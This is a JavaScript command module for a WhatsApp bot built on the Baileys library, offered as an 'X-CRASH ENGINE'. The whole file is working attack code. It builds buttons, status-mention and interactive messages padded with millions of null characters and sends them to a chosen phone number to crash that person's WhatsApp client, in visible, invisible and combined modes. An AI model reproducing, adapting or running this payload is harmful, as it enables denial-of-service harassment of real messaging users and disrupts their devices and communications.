import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "xcrash",
  alias: ["xbug", "payloadx"],
  description: "Executes ultra-heavy visible/invisible crash payloads (Owner Only)",
  category: "Bug",
  group: false,
  admin: false,
  botAdmin: false,
  ownerOnly: true,

  async execute(kaya, mek, from, args, prefix) {
    try {
      // 🔐 Récupération sécurisée de l'ID du propriétaire du bot (comme dans botname.js)
      const ownerId = kaya.user?.id ? kaya.user.id.split(':')[0] : '';
      if (!ownerId) {
        return await kaya.sendMessage(from, { text: "❌ Erreur : Impossible de récupérer l'ID du propriétaire du bot." }, { quoted: mek });
      }

      // Target and Sub-mode selection
      const target = args[1] ? args[1] + "@s.whatsapp.net" : from;
      const mode = args[0]?.toLowerCase();

      if (!['visible', 'invisible', 'cvisible', 'cinvisible', 'all'].includes(mode)) {
        return kaya.sendMessage(from, {
          text: `💥 *KAY BOT X-CRASH ENGINE*\n\nUsage:\n${prefix}xcrash visible [target]\n${prefix}xcrash invisible [target]\n${prefix}xcrash cvisible [target]\n${prefix}xcrash cinvisible [target]\n${prefix}xcrash all [target]`
        }, { quoted: mek });
      }

      // Massive null padding augmentation for maximum buffer overflow
      const heavyNulls = "\u0000".repeat(2000000);
      const heavyJsonNulls = "\u0000".repeat(3000000);

      // --- 1. VisibleX Hardened ---
      const runVisibleX = async (isTarget) => {
        const msg = await generateWAMessageFromContent(isTarget, {
          buttonsMessage: {
            text: "🩸 KAY BOT CRASH ACTIVE 🩸",
            contentText: "⭑̤⟅̊༑ ▾ 𝚉͢𝐍ͮ𝐗 ⿻ 𝐊𝐀𝐘 𝐁𝐎𝐓 𝐈𝐍𝐕𝐀𝐒𝐈𝐎𝐍 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + heavyNulls,
            footerText: "KAY BOT Is Here ϟ",
            buttons: [
              {
                buttonId: ".null",
                buttonText: {
                  displayText: " #KAYBOTExec1St " + heavyNulls
                },
                type: 1
              }
            ],
            headerType: 1
          }
        }, {});

        await kaya.relayMessage(isTarget, msg.message, {
          messageId: msg.key.id,
          participant: { jid: isTarget }
        });
      };

      // --- 2. InVisibleX Hardened ---
      const runInVisibleX = async (isTarget, show = true) => {
        let msg = await generateWAMessageFromContent(isTarget, {
          buttonsMessage: {
            text: "🩸",
            contentText: "⭑̤⟅̊༑ ▾ 𝚉͢𝐍ͮ𝐗 ⿻ 𝐊𝐀𝐘 𝐁𝐎𝐓 𝐈𝐍𝐕𝐀𝐒𝐈𝐎𝐍 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + heavyNulls,
            footerText: "KAY BOT Is Here ϟ",
            buttons: [
              {
                buttonId: ".null",
                buttonText: {
                  displayText: " #KAYBOTExec1St " + heavyNulls,
                },
                type: 1,
              },
            ],
            headerType: 1,
          },
        }, {});

        await kaya.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [isTarget],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [
                    {
                      tag: "to",
                      attrs: { jid: isTarget },
                      content: undefined,
                    },
                  ],
                },
              ],
            },
          ],
        });

        if (show) {
          await kaya.relayMessage(
            isTarget,
            {
              groupStatusMentionMessage: {
                message: {
                  protocolMessage: {
                    key: msg.key,
                    type: 25,
                  },
                },
              },
            },
            {
              additionalNodes: [
                {
                  tag: "meta",
                  attrs: {
                    is_status_mention: "🎭⃟༑⌁⃰𝐊𝐀𝐘 𝐁𝐎𝐓 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                  },
                  content: undefined,
                },
              ],
            }
          );
        }
      };

      // --- 3. CVisible Hardened ---
      const runCVisible = async (isTarget) => {
        await kaya.relayMessage(
          isTarget,
          {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "kaya modded crash payload",
                    format: "DEFAULT",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: heavyJsonNulls,
                    version: 3,
                  },
                },
              },
            },
          },
          {
            participant: { jid: isTarget },
          }
        );
      };

      // --- 4. CInVisible Hardened ---
      const runCInVisible = async (isTarget, show = true) => {
        const msg = await generateWAMessageFromContent(
          isTarget,
          {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "KAY BOT Overload",
                    format: "DEFAULT",
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: heavyJsonNulls,
                    version: 3,
                  },
                },
              },
            },
          },
          {}
        );

        await kaya.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [isTarget],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [
                    {
                      tag: "to",
                      attrs: { jid: isTarget },
                      content: undefined,
                    },
                  ],
                },
              ],
            },
          ],
        });

        if (show) {
          await kaya.relayMessage(
            isTarget,
            {
              groupStatusMentionMessage: {
                message: {
                  protocolMessage: {
                    key: msg.key,
                    type: 25,
                  },
                },
              },
            },
            {
              additionalNodes: [
                {
                  tag: "meta",
                  attrs: {
                    is_status_mention: "🎭⃟༑⌁⃰𝐊𝐀𝐘 𝐁𝐎𝐓 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                  },
                  content: undefined,
                },
              ],
            }
          );
        }
      };

      // Execution switch based on arguments
      if (mode === 'visible') {
        await runVisibleX(target);
      } else if (mode === 'invisible') {
        await runInVisibleX(target, true);
      } else if (mode === 'cvisible') {
        await runCVisible(target);
      } else if (mode === 'cinvisible') {
        await runCInVisible(target, true);
      } else if (mode === 'all') {
        await runVisibleX(target);
        await runInVisibleX(target, true);
        await runCVisible(target);
        await runCInVisible(target, true);
      }

      await kaya.sendMessage(from, { text: `⚡ KAY BOT XCrash payload [${mode.toUpperCase()}] successfully deployed!` }, { quoted: mek });

    } catch (err) {
      console.error("❌ Error in xcrash command:", err);
      await kaya.sendMessage(from, { text: `Execution error: ${err.message}` }, { quoted: mek });
    }
  }
};
